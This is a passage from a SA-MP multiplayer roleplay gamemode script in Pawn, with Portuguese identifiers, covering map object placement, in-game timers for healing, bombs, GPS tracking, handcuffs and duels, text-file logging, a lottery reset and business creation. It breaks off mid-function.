	CreateDynamicObject(1510, 1093.18872, 247.24879, 531.51959,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1093.51782, 247.66611, 531.59961,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1093.52197, 246.90456, 531.59961,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1487, 1093.21094, 246.99130, 531.69958,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1093.24023, 247.59270, 531.57959,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1510, 1078.47839, 246.64101, 531.52319,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1510, 1073.60254, 246.58992, 531.51300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1668, 1078.88452, 246.44780, 531.66290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1668, 1078.88086, 246.60620, 531.66290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1520, 1078.05786, 246.32370, 531.56293,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1520, 1078.23828, 246.56239, 531.56293,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1543, 1074.05408, 246.38322, 531.49286,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1544, 1073.97400, 246.52472, 531.49274,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1517, 1073.18823, 246.25780, 531.69269,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1520, 1073.58521, 246.24110, 531.55267,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1073.28918, 246.61169, 531.57288,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1510, 1092.22107, 243.66570, 534.99591,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1510, 1088.30298, 243.70970, 534.99640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1510, 1077.75281, 243.66389, 535.01288,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1510, 1074.15808, 243.58087, 535.01331,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1520, 1073.32202, 243.28880, 535.05371,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1517, 1073.83740, 243.31371, 535.19373,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1544, 1074.63171, 243.35699, 534.99365,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1668, 1075.17664, 243.40570, 535.15363,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1076.92651, 243.42690, 535.09302,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1077.50098, 243.41827, 535.09302,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1078.04309, 243.43370, 535.09302,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1078.67065, 243.45650, 535.09277,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1487, 1078.34058, 243.69867, 535.19281,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1487, 1077.18225, 243.81160, 535.19281,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1544, 1087.22925, 243.40549, 534.97662,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1543, 1087.77222, 243.42233, 534.97662,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1520, 1088.40576, 243.43530, 535.03662,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1517, 1089.17688, 243.45830, 535.17682,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1091.41101, 243.45560, 535.05560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1950, 1091.89087, 243.44540, 535.15558,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1950, 1092.54822, 243.48770, 535.15558,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1668, 1093.21863, 243.45630, 535.15558,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19384, 1097.37842, 254.84201, 532.71851,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1523, 1097.30420, 255.65350, 531.01764,   0.00000, 0.00000, 270.05823);
	CreateDynamicObject(1667, 1084.68530, 257.96530, 532.21558,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1084.36487, 257.95261, 532.21552,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1084.51599, 258.13681, 532.21558,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1951, 1084.49988, 257.88101, 532.29541,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1080.10498, 257.94901, 532.21301,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1079.73962, 257.93689, 532.21301,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1080.00378, 258.09949, 532.21301,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1079.80994, 258.08600, 532.21301,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1509, 1079.93079, 257.88019, 532.31293,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1075.15515, 257.93231, 532.22839,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1075.45557, 257.97559, 532.22839,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1520, 1075.31311, 257.95554, 532.12872,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1075.46777, 257.82889, 532.22882,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 1075.25757, 258.11230, 532.22839,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14416, 1068.50037, 254.64868, 531.89697,   0.00000, 0.00000, 180.17220);
	CreateDynamicObject(19462, 1068.87573, 247.99246, 535.00677,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19446, 1067.50964, 254.75871, 532.71722,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1067.49768, 254.86142, 536.17542,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1067.50464, 245.34023, 536.16772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1065.67773, 247.82137, 536.25067,   0.00000, 0.00000, 90.73271);
	CreateDynamicObject(1723, 1070.02832, 248.47540, 535.05481,   0.00000, 0.00000, 180.66220);
	CreateDynamicObject(19354, 1070.45715, 256.96240, 529.63019,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1523, 1070.60217, 257.97617, 530.99030,   0.00000, 0.00000, 90.12054);
	CreateDynamicObject(19403, 1070.54614, 251.89293, 536.25690,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2169, 1070.11096, 252.34720, 534.93518,   0.00000, 0.00000, 269.34000);
	CreateDynamicObject(14820, 1070.02710, 251.83868, 535.80640,   0.00000, 0.00000, 89.15040);
	CreateDynamicObject(2229, 1070.23083, 250.83150, 534.50067,   0.00000, 0.00000, 90.01660);
	CreateDynamicObject(2229, 1070.22266, 253.58200, 534.49182,   0.00000, 0.00000, 90.06530);
	CreateDynamicObject(2229, 1070.22803, 250.83160, 535.90002,   0.00000, 0.00000, 90.20930);
	CreateDynamicObject(2229, 1070.21985, 253.58060, 535.89270,   0.00000, 0.00000, 90.00700);
	CreateDynamicObject(1509, 1070.44214, 252.69856, 535.92603,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1509, 1070.32141, 251.04817, 535.92578,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19424, 1070.43384, 251.86351, 535.72620,   0.00000, 0.00000, 271.37057);
	CreateDynamicObject(19317, 1067.61108, 249.86678, 536.72839,   0.00000, 0.00000, 93.05944);
	CreateDynamicObject(19318, 1067.61011, 250.94620, 536.71033,   0.00000, 0.00000, 90.04400);
	CreateDynamicObject(19319, 1067.58716, 252.08290, 536.70007,   0.00000, 0.00000, 92.56490);
	CreateDynamicObject(18648, 1100.13843, 255.84381, 534.24500,   0.00000, 0.00000, 90.03674);
	CreateDynamicObject(18648, 1090.60913, 263.25055, 534.46014,   0.00000, 0.00000, 89.91984);
	CreateDynamicObject(18648, 1095.43445, 249.21919, 534.50256,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18648, 1091.47717, 240.82396, 537.69122,   0.00000, 0.00000, 89.81835);
	CreateDynamicObject(18648, 1075.73022, 240.75079, 537.60840,   0.00000, 0.00000, 90.42354);
	CreateDynamicObject(18648, 1075.41663, 244.18590, 534.33374,   0.00000, 0.00000, 89.24934);
	CreateDynamicObject(18648, 1080.05457, 259.71396, 534.45459,   0.00000, 0.00000, 90.49912);
	CreateDynamicObject(18648, 1070.65747, 251.92130, 534.47620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18102, 1086.08435, 250.00197, 537.19409,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19159, 1081.79236, 252.22664, 537.47791,   0.00000, 0.00000, 0.00000);
	// Pontos de Ônibus
	CreateDynamicObject(1257,1246.09960938,-1845.19921875,13.80000019,0.00000000,0.00000000,90.00000000); //object(bustopm)(1)
	CreateDynamicObject(1257,1549.00000000,-1738.59960938,13.80000019,0.00000000,0.00000000,269.74731445); //object(bustopm)(2)
	CreateDynamicObject(1257,1756.00000000,-1679.19921875,13.80000019,0.00000000,0.00000000,0.00000000); //object(bustopm)(3)
	CreateDynamicObject(1257,1535.89941406,-1660.29980469,13.80000019,0.00000000,0.00000000,0.00000000); //object(bustopm)(4)
	CreateDynamicObject(1257,1828.19921875,-1673.50000000,13.80000019,0.00000000,0.00000000,0.00000000); //object(bustopm)(5)
	CreateDynamicObject(1257,1921.39941406,-1758.69921875,13.80000019,0.00000000,0.00000000,270.00000000); //object(bustopm)(6)
	CreateDynamicObject(1257,2260.59960938,-1667.50000000,15.69999981,0.00000000,0.00000000,270.00000000); //object(bustopm)(7)
	CreateDynamicObject(1257,2112.50000000,-1100.59960938,25.50000000,0.00000000,0.00000000,73.24584961); //object(bustopm)(8)
	CreateDynamicObject(1257,1616.59960938,-1167.19921875,24.39999962,0.00000000,0.00000000,270.00000000); //object(bustopm)(9)
	CreateDynamicObject(1257,2264.60009766,-1652.80004883,15.89999962,0.00000000,0.00000000,90.00000000); //object(bustopm)(10)
	CreateDynamicObject(1257,1246.40002441,-1858.40002441,13.69999981,0.00000000,0.00000000,270.00000000); //object(bustopm)(11)
	CreateDynamicObject(1257,821.09997559,-1983.30004883,13.10000038,0.00000000,0.00000000,180.00000000); //object(bustopm)(12)
	CreateDynamicObject(1257,1556.59997559,-1726.00000000,13.80000019,0.00000000,0.00000000,90.00000000); //object(bustopm)(13)
	CreateDynamicObject(1257,1523.19995117,-1660.50000000,13.80000019,0.00000000,0.00000000,180.00000000); //object(bustopm)(14)
	CreateDynamicObject(1257,1743.50000000,-1676.00000000,13.80000019,0.00000000,0.00000000,180.00000000); //object(bustopm)(3)
	CreateDynamicObject(1257,1815.19995117,-1673.59997559,13.80000019,0.00000000,0.00000000,180.00000000); //object(bustopm)(5)
	CreateDynamicObject(1257,1921.59997559,-1746.00000000,13.80000019,0.00000000,0.00000000,90.00000000); //object(bustopm)(6)
	CreateDynamicObject(1257,2108.89990234,-1112.90002441,25.50000000,0.00000000,0.00000000,252.24584961); //object(bustopm)(8)
	CreateDynamicObject(1257,1617.80004883,-1154.50000000,24.39999962,0.00000000,0.00000000,90.00000000); //object(bustopm)(9)
	CreateDynamicObject(1257,851.29998779,-2035.69995117,13.10000038,0.00000000,0.00000000,0.00000000); //object(bustopm)(10)
    // Máquinas de Refri
	//CreateMachine(MACHINE_SPRUNK, 1213.99133301,-1817.75781250,13.69277763, 0.0, 0.0, 0.0, 10.0, true);
}

forward PassarEfeitoCura(playerid);
public PassarEfeitoCura(playerid)
{
	SetPlayerHealth(playerid, 100.0);
	SetPlayerDrunkLevel(playerid, 0);
	SetPlayerWeather(playerid, 0);
	return 1;
}

forward FlashFoto(playerid);
public FlashFoto(playerid)
{
	TextDrawShowForPlayer(playerid, Flash);
	SetTimerEx("FlashFotoSair", 1000, false, "i", playerid);
	return 1;
}

forward FlashFotoSair(playerid);
public FlashFotoSair(playerid)
{
	TextDrawHideForPlayer(playerid, Flash);
	return 1;
}

forward PassarEfeitoDrogas(playerid);
public  PassarEfeitoDrogas(playerid)
{
	SetPlayerWeather(playerid, 10);
    SetPlayerDrunkLevel(playerid, 0);
	return 1;
}

forward NovaBomba(playerid);
public NovaBomba(playerid)
{
    PlantouBomba[playerid] = 0;
	SendClientMessage(playerid, COR_AMARELO, "Você já pode plantar outra bomba!");
	return 1;
}

forward DestruirObjeto(objid);
public DestruirObjeto(objid) DestroyDynamicObject(objid);
forward CriarExplosao(Float:X,Float:Y,Float:Z,tipo,Float:diam);
public CriarExplosao(Float:X,Float:Y,Float:Z,tipo,Float:diam) CreateExplosion(X,Y,Z,tipo,diam);

forward AtualizaGPS(playerid, playerid2);
public AtualizaGPS(playerid, playerid2)
{
	if(IsPlayerConnected(playerid2))
	{
		new
			Float:Distance
		;
		Distance = GetDistanceBetweenPlayers(playerid, playerid2);
		new
			Float:X,
			Float:Y,
			Float:Z
		;
		GetPlayerPos(playerid2, X, Y, Z);
		DisablePlayerCheckpoint(playerid);
		SetPlayerCheckpoint(playerid, X, Y, Z, 0.1);
		new
			string[128]
		;
		new
			zone[MAX_ZONE_NAME]
		;
		TextDrawShowForPlayer(playerid, GPSLocal);
		GetPlayer2DZone(playerid2, zone, MAX_ZONE_NAME);
	    format(string, sizeof(string), "~n~~r~~h~Local: ~w~%s~n~~b~~h~Distancia: ~w~%.1f metros", zone, Distance);
	    TextDrawSetString(GPSLocal, string);
		if(Distance <= 4.0)
		{
			DisablePlayerCheckpoint(playerid);
			KillTimer(T_GPS[playerid]);
			GPS[playerid] = false;
			T_GPS[playerid] = 0;
		}
	}
	else
	{
		DisablePlayerCheckpoint(playerid);
		KillTimer(T_GPS[playerid]);
		GPS[playerid] = false;
		T_GPS[playerid] = 0;
		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		TextDrawHideForPlayer(playerid, GPSLocal);
	}
	return 1;
}

forward LiberadoParaAndar(playerid);
public LiberadoParaAndar(playerid)
{
    SendClientMessage(playerid, COR_AMARELO, "Você foi desalgemado.");
    //TogglePlayerControllable(playerid, true);
    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
    Algemado[playerid] = 0;
	return 1;
}

stock GetDriverID(vehicleid)
{
    foreach(Player, i)
    {
        if(GetPlayerVehicleID(i) == vehicleid && GetPlayerState(i) == 2) return i;
    }
    return -1;
}

stock Congelado(playerid, on = 0)
{
	switch(on)
	{
		case 0: TogglePlayerControllable(playerid, false);
		case 1: TogglePlayerControllable(playerid, true);
	}
}

stock DeleteAllStrip()
{
    for(new i = 0; i < sizeof(SpikeInfo); i++)
  	{
  	    if(SpikeInfo[i][sCreated] == 1)
  	    {
  	        SpikeInfo[i][sCreated]=0;
            SpikeInfo[i][sX]=0.0;
            SpikeInfo[i][sY]=0.0;
            SpikeInfo[i][sZ]=0.0;
            DestroyDynamicObject(SpikeInfo[i][sObject]);
  	    }
	}
    return 0;
}

stock DeleteClosestStrip(playerid)
{
    for(new i = 0; i < sizeof(SpikeInfo); i++)
  	{
  	    if(IsPlayerInRangeOfPoint(playerid, 2.0, SpikeInfo[i][sX], SpikeInfo[i][sY], SpikeInfo[i][sZ]))
        {
  	        if(SpikeInfo[i][sCreated] == 1)
            {
                SpikeInfo[i][sCreated] = 0;
                SpikeInfo[i][sX] = 0.0;
                SpikeInfo[i][sY] = 0.0;
                SpikeInfo[i][sZ] = 0.0;
                DestroyDynamicObject(SpikeInfo[i][sObject]);
                return 1;
  	        }
  	    }
  	}
    return 0;
}

forward CarregarKit(playerid);
public CarregarKit(playerid)
{
	if(pInfo[playerid][Tem_Kit] == 1)
	{
		ResetPlayerWeapons(playerid);
  		GivePlayerWeapon(playerid, 24, 99999); // Eagle
  		GivePlayerWeapon(playerid, 26, 99999); // Sawn-off
  		GivePlayerWeapon(playerid, 32, 99999); // Tec-9
  		GivePlayerWeapon(playerid, 34, 99999); // Sniper
  		GivePlayerWeapon(playerid, 31, 99999); // M4
  		GivePlayerWeapon(playerid, 5, 1); // Serra
  		return 1;
	}
	return 1;
}

forward Banido(playerid);
public Banido(playerid)
{
	Kick(playerid);
	return 1;
}

GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
	new
		Float:a
	;
	GetPlayerPos(playerid, x, y, a);
	GetPlayerFacingAngle(playerid, a);
	if(GetPlayerVehicleID(playerid))
	{
		GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
	}
	x += (distance * floatsin(-a, degrees));
	y += (distance * floatcos(-a, degrees));
}

encode_tires(tires1, tires2, tires3, tires4)
{
	return tires1 | (tires2 << 1) | (tires3 << 2) | (tires4 << 3);
}

forward ContagemDuelo(playerid);
public ContagemDuelo(playerid)
{
    new
		gDuelo[24]
	;
	TempoCounTD[playerid] --;
	format(gDuelo, sizeof(gDuelo), "~n~~n~~g~~h~~h~%d", TempoCounTD[playerid]);
	GameTextForPlayer(playerid, gDuelo, 900, 5);
    if(TempoCounTD[playerid] <= 0)
    {
        KillTimer(TimerDuelo[playerid]);
        ResetPlayerWeapons(playerid);
        GivePlayerWeapon(playerid, 24, 9999);
        GivePlayerWeapon(playerid, 26, 9999);
        GivePlayerWeapon(playerid, 28, 9999);
        GameTextForPlayer(playerid, "~n~~n~~r~~h~~h~VALENDO!", 1000, 5);
        TogglePlayerControllable(playerid, true);
    }
    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
	return 1;
}

stock SetPlayerNoveiculo(playerid, Float:X, Float:Y, Float:Z, Float:Angulo, Interior)
{
	new veiculo = GetPlayerVehicleID(playerid);
	new State = GetPlayerState(playerid);
	SetPlayerInterior(playerid, Interior);
	{
		if(State!=PLAYER_STATE_DRIVER) { SetPlayerPos(playerid, X, Y, Z); }
		else if(IsPlayerInVehicle(playerid, veiculo) == 1) { SetVehiclePos(veiculo, X, Y, Z); SetVehicleZAngle(veiculo, Angulo);}
		else { SetPlayerPos(playerid, X, Y, Z); }
		SetPlayerFacingAngle(playerid, Angulo);
	}
}

stock RenomearArquivo(fileorigem[],filerename[])
{
    new
		string[512]
	;
    new
		File:fileo = fopen(fileorigem, io_read)
	;
    new
		File:filer = fopen(filerename, io_write)
	;
    while(fread(fileo, string))
    {
        fwrite(filer,string);
    }
    fclose(filer);
    fclose(fileo);
    fremove(fileorigem);
}

forward TempoComprarNick(playerid);
public TempoComprarNick(playerid)
{
	N_Liberado[playerid] = 0;
	return 1;
}

forward TempoComprarCasa(playerid);
public TempoComprarCasa(playerid)
{
	LiberadoCasa[playerid] = 0;
	return 1;
}

forward Transferencias(string[]);
public Transferencias(string[])
{
	new
		var_1[256]
	;
	new
		File:var_2
	;
	format(var_1, sizeof(var_1), "%s\r\n", string);
	var_2 = fopen("Transferencias.txt", io_append);
	fwrite(var_2, var_1);
	fclose(var_2);
}

forward Reports(string[]);
public Reports(string[])
{
	new
		var_1[256]
	;
	new
		File:var_2
	;
	format(var_1, sizeof(var_1), "%s\r\n", string);
	var_2 = fopen("Reports.txt", io_append);
	fwrite(var_2, var_1);
	fclose(var_2);
}

forward LogSetGrana(string[]);
public LogSetGrana(string[])
{
	new
		var_1[256]
	;
	new
		File:var_2
	;
	format(var_1, sizeof(var_1), "%s\r\n", string);
	var_2 = fopen("SetadosGrana.txt", io_append);
	fwrite(var_2, var_1);
	fclose(var_2);
}

forward log_setados_sms(string[]);
public log_setados_sms(string[])
{
	new
		var_1[256]
	;
	new
		File:var_2
	;
	format(var_1, sizeof(var_1), "%s\r\n", string);
	var_2 = fopen("setados_sms.txt", io_append);
	fwrite(var_2, var_1);
	fclose(var_2);
}

forward log_setados_level(string[]);
public log_setados_level(string[])
{
	new
		var_1[256]
	;
	new
		File:var_2
	;
	format(var_1, sizeof(var_1), "%s\r\n", string);
	var_2 = fopen("setados_level.txt", io_append);
	fwrite(var_2, var_1);
	fclose(var_2);
}

forward LogNick(string[]);
public LogNick(string[])
{
	new
		var_1[256]
	;
	new
		File:var_2
	;
	format(var_1, sizeof(var_1), "%s\r\n", string);
	var_2 = fopen("MudancadeNick.txt", io_append);
	fwrite(var_2, var_1);
	fclose(var_2);
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
    foreach(Player, i)
    {
		if(GetPlayerState(i) == PLAYER_STATE_SPECTATING)
		{
			if(SpectateID[i] == playerid)
			{
				if(SpectateType[i] == ADMIN_SPEC_TYPE_PLAYER)
				{
               		SetPlayerInterior(i, newinteriorid);
				}
			}
		}
    }
	return 1;
}

stock IsVehicleOccupied(vehicleid)
{
	foreach(Player, i) if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == PLAYER_STATE_DRIVER)
	return 1; return 0;
}

stock strrest(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}
	new offset = index;
	new result[128];
	while ((index < length) && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}

stock GetVehicleModelID(nome[])
{
	for(new i = 0; i < 211; i++)
	{
		if (strfind(vNome[i], nome, true) != -1) return i + 400;
	}
	return -1;
}

stock SetPlayerRemoteFunction(senderid, const str[])
{
    CallRemoteFunction("OnPlayerCommandText", "is", senderid, str);
}

stock LimparLoteria()
{
	WE_RemoveFile("Loteria.ini");
	WE_CreateFile("Loteria.ini");
	WE_SetString("Loteria.ini", "1", "1");
	WE_SetString("Loteria.ini", "2", "1");
	WE_SetString("Loteria.ini", "3", "1");
	WE_SetString("Loteria.ini", "4", "1");
	WE_SetString("Loteria.ini", "5", "1");
	WE_SetString("Loteria.ini", "6", "1");
	WE_SetString("Loteria.ini", "7", "1");
	WE_SetString("Loteria.ini", "8", "1");
	WE_SetString("Loteria.ini", "9", "1");
	WE_SetString("Loteria.ini", "10", "1");
	WE_SetString("Loteria.ini", "11", "1");
	WE_SetString("Loteria.ini", "12", "1");
	WE_SetString("Loteria.ini", "13", "1");
	WE_SetString("Loteria.ini", "14", "1");
	WE_SetString("Loteria.ini", "15", "1");
	WE_SetString("Loteria.ini", "16", "1");
	WE_SetString("Loteria.ini", "17", "1");
	WE_SetString("Loteria.ini", "18", "1");
	WE_SetString("Loteria.ini", "19", "1");
	WE_SetString("Loteria.ini", "20", "1");
	WE_SetString("Loteria.ini", "21", "1");
	WE_SetString("Loteria.ini", "22", "1");
	WE_SetString("Loteria.ini", "23", "1");
	WE_SetString("Loteria.ini", "24", "1");
	WE_SetString("Loteria.ini", "25", "1");
	WE_SetString("Loteria.ini", "26", "1");
	WE_SetString("Loteria.ini", "27", "1");
	WE_SetString("Loteria.ini", "28", "1");
	WE_SetString("Loteria.ini", "29", "1");
	WE_SetString("Loteria.ini", "30", "1");
	WE_SetString("Loteria.ini", "31", "1");
	WE_SetString("Loteria.ini", "32", "1");
	WE_SetString("Loteria.ini", "33", "1");
	WE_SetString("Loteria.ini", "34", "1");
	WE_SetString("Loteria.ini", "35", "1");
	WE_SetString("Loteria.ini", "36", "1");
	WE_SetString("Loteria.ini", "37", "1");
	WE_SetString("Loteria.ini", "38", "1");
	WE_SetString("Loteria.ini", "39", "1");
	WE_SetString("Loteria.ini", "40", "1");
	WE_SetString("Loteria.ini", "41", "1");
	WE_SetString("Loteria.ini", "42", "1");
	WE_SetString("Loteria.ini", "43", "1");
	WE_SetString("Loteria.ini", "44", "1");
	WE_SetString("Loteria.ini", "45", "1");
	WE_SetString("Loteria.ini", "46", "1");
	WE_SetString("Loteria.ini", "47", "1");
	WE_SetString("Loteria.ini", "48", "1");
	WE_SetString("Loteria.ini", "49", "1");
	WE_SetString("Loteria.ini", "50", "1");
	WE_SetString("Loteria.ini", "51", "1");
	WE_SetString("Loteria.ini", "52", "1");
	WE_SetString("Loteria.ini", "53", "1");
	WE_SetString("Loteria.ini", "54", "1");
	WE_SetString("Loteria.ini", "55", "1");
	WE_SetString("Loteria.ini", "56", "1");
	WE_SetString("Loteria.ini", "57", "1");
	WE_SetString("Loteria.ini", "58", "1");
	WE_SetString("Loteria.ini", "59", "1");
	WE_SetString("Loteria.ini", "60", "1");
}

stock CriarEmpresa(empresaid, eNome[], Float:Pickupx, Float:Pickupy, Float:Pickupz, Float:interiorX, Float:interiorY, Float:interiorZ, Interior, virtualworld, cPreco)
{
	new
		empresas[256]
	;
	format(empresas, sizeof(empresas), "Empresas/Empresa%d.ini", empresaid);

	if(!fexist(empresas))
	{
		WE_CreateFile(empresas);

	    EmpresaInfo[empresaid][Numero] = empresaid;
   		format(EmpresaInfo[empresaid][Proprietario], 12, "Ninguem");
		WE_SetString(empresas, "Proprietario", "Ninguem");
   		format(EmpresaInfo[empresaid][Funcionario1], 12, "Ninguem");
		WE_SetString(empresas, "Funcionario1", "Ninguem");
   		format(EmpresaInfo[empresaid][Funcionario2], 12, "Ninguem");
		WE_SetString(empresas, "Funcionario2", "Ninguem");
   		format(EmpresaInfo[empresaid][Funcionario3], 12, "Ninguem");
   		WE_SetString(empresas, "Funcionario3", "Ninguem");
 		format(EmpresaInfo[empresaid][NomeEmp], 12, eNome);
		format(EmpresaInfo[empresaid][NomeEmpresa], 12, "Nenhum");
		WE_SetString(empresas, "NomeEmpresa", "Nenhum");
		WE_SetString(empresas, "Login", "00/00/0000");
		format(EmpresaInfo[empresaid][Login], 12, "00/00/0000");
		WE_SetString(empresas, "Horario", "00:00:00");
		format(EmpresaInfo[empresaid][Horario], 12, "00:00:00");
		WE_SetInt(empresas, "Producao1", 0);
		WE_SetInt(empresas, "Producao2", 0);
		WE_SetInt(empresas, "Producao3", 0);
		WE_SetInt(empresas, "P1Atual", 0);
		WE_SetInt(empresas, "P2Atual", 0);
		WE_SetInt(empresas, "P3Atual", 0);
        EmpresaInfo[empresaid][PickupX] = Pickupx;
        EmpresaInfo[empresaid][PickupY] = Pickupy;
        EmpresaInfo[empresaid][PickupZ] = Pickupz;
       	EmpresaInfo[empresaid][InteriorX] = interiorX;
		EmpresaInfo[empresaid][InteriorY] = interiorY;
		EmpresaInfo[empresaid][InteriorZ] = interiorZ;
		EmpresaInfo[empresaid][InteriorID] = Interior;
		EmpresaInfo[empresaid][Preco] = cPreco;
		EmpresaInfo[empresaid][VirtualWorld] = virtualworld;
		EmpresaInfo[empresaid][Aberta] = 1;
		WE_SetInt(empresas, "Numero", empresaid);
		WE_SetFloat(empresas, "InteriorX", interiorX);
		WE_SetFloat(empresas, "InteriorY", interiorY);
		WE_SetFloat(empresas, "InteriorZ", interiorZ);
		WE_SetInt(empresas, "Interior", Interior);
		WE_SetInt(empresas, "Valor", cPreco);
		WE_SetInt(empresas, "VirtualWorld", virtualworld);
		WE_SetInt(empresas, "Dono", 0);
		WE_SetInt(empresas, "Aberta", 1);
	}
	else
	{
	    format(EmpresaInfo[empresaid][NomeEmp], 64, eNome);
	    format(EmpresaInfo[empresaid][EmpresaNome], 64, WE_GetString(empresas, "NomeEmpresa"));
 		format(EmpresaInfo[empresaid][Proprietario], 24, WE_GetString(empresas, "Proprietario"));
 		format(EmpresaInfo[empresaid][Funcionario1], 24, WE_GetString(empresas, "Funcionario1"));
 		format(EmpresaInfo[empresaid][Funcionario2], 24, WE_GetString(empresas, "Funcionario2"));
 		format(EmpresaInfo[empresaid][Funcionario3], 24, WE_GetString(empresas, "Funcionario3"));
	    format(EmpresaInfo[empresaid][NomeEmpresa], 64, WE_GetString(empresas, "NomeEmpresa"));
		//
		format(pFile, 128, "Contas/%s.ini", WE_GetString(empresas, "Proprietario"));
	    format(EmpresaInfo[empresaid][Horario], 12, WE_GetString(pFile, "ulHorario"));
	    format(EmpresaInfo[empresaid][Login], 12, WE_GetString(pFile, "ulData"));
	    //
		EmpresaInfo[empresaid][Numero] = WE_GetInt(empresas, "Numero");
		EmpresaInfo[empresaid][Preco] = WE_GetInt(empresas, "Valor");
		EmpresaInfo[empresaid][Aberta] = WE_GetInt(empresas, "Aberta");
		EmpresaInfo[empresaid][InteriorID] = WE_GetInt(empresas, "Interior");
		EmpresaInfo[empresaid][InteriorX] = WE_GetFloat(empresas, "InteriorX");
		EmpresaInfo[empresaid][InteriorY] = WE_GetFloat(empresas, "InteriorY");
		EmpresaInfo[empresaid][InteriorZ] = WE_GetFloat(empresas, "InteriorZ");
		EmpresaInfo[empresaid][VirtualWorld] = WE_GetInt(empresas, "VirtualWorld");
	}

	EmpresaInfo[empresaid][PickupX] = Pickupx;
	EmpresaInfo[empresaid][PickupY] = Pickupy;
	EmpresaInfo[empresaid][PickupZ] = Pickupz;

	if(WE_GetInt(empresas, "Dono") == 0)
	{
	    EmpresaPickup[empresaid] = CreatePickup(1577, 23, Pickupx, Pickupy, Pickupz);
 		format(gstring, sizeof(gstring), "{FF1E1E}%s  ID %d\n{FFFFFF}Dono(a) {2E9CF7}%s\n{FFFFFF}/Empresa Info", EmpresaInfo[empresaid][NomeEmp], EmpresaInfo[empresaid][Numero], EmpresaInfo[empresaid][Proprietario]);
		EmpresaInfo[empresaid][TxTt] = Create3DTextLabel(gstring, -1, Pickupx, Pickupy, Pickupz+0.75, 35.0,0,1);
	}
	if(WE_GetInt(empresas, "Dono") == 1)
	{
	    EmpresaPickup[empresaid] = CreatePickup(1579, 23, Pickupx, Pickupy, Pickupz);
 		format(gstring, sizeof(gstring), "{FF1E1E}%s  ID %d\n{FFFFFF}Dono(a) {2E9CF7}%s\n{FFFFFF}/Empresa Info", EmpresaInfo[empresaid][NomeEmp], EmpresaInfo[empresaid][Numero], EmpresaInfo[empresaid][Proprietario]);
